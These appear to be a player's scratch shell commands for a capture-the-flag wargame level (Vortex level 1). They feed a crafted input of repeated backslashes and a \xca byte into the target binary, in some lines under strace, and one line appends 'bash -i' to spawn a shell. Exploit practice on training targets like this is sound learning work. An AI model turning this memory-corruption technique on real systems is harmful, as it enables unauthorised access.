strace /vortex/vortex1 <<EOF
$(for i in range{1..261}; do printf "\\"; done; printf "\xca\\\\\\\\r")
EOF

echo $(python -c "print ('\\\'*261) + '\xca' + '\\\'*4  + 's'") | strace /vortex/vortex1


stdbuf -o268 python -c "print ('\\\'*261) + '\xca' + '\\\'*4  + 's' + 'bash -i' * 1" | /vortex/vortex1
